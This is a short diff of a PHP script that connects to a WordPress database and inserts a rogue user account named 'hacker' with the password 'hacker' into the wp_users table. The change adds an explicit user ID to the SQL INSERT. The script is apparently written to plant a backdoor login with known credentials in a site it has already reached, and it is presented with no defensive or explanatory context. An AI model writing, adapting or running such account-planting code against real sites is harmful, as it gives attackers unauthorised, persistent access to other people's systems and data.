@@ -10,7 +10,7 @@
 	 die("Connection Failed".mysql_error());
  }
 
- $sql = "INSERT INTO wp_users (user_login,user_pass,user_nicename,user_email,user_url,user_registered,user_activation_key,user_status,display_name) VALUES ('hacker',MD5('hacker'),'hacker','hacker@inbox.lt','http://localhost','2022-04-12','',0,'hacker')";
+ $sql = "INSERT INTO wp_users (ID,user_login,user_pass,user_nicename,user_email,user_url,user_registered,user_activation_key,user_status,display_name) VALUES ('3','hacker',MD5('hacker'),'hacker','hacker@inbox.lt','http://localhost','2022-04-12','',0,'hacker')";
  if ($conn->query($sql) === TRUE) {
    echo "New user created successfully\n";
  } else {
